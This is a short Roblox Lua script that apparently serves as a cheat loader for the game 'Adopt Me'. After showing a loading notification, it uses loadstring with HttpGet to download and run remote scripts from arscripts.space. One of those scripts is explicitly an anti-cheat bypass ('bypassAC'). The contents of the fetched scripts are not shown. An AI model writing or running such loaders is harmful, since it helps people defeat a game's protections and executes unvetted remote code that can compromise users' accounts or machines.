local AkaliNotif = loadstring(game:HttpGet("https://arscripts.space/nsNotify/Notifyns.lua"))();
local Notify = AkaliNotif.Notify;

wait(1);

Notify({
Description = "ADOPT ME | V0.1, SCRIPT IS LOADING IN PLEASE WAIT....";
Title = "ADOPT ME | V0.1 ";
Duration = 3;
});


local function bypassAC()
        loadstring(game:HttpGet("https://arscripts.space/adoptmetb/AdoptmeAC.lua"))()
end

local function adoptme()
        loadstring(game:HttpGet("https://arscripts.space/adoptmetb/AdoptmNS.lua"))()
end

task.spawn(bypassAC)
task.spawn(adoptme)

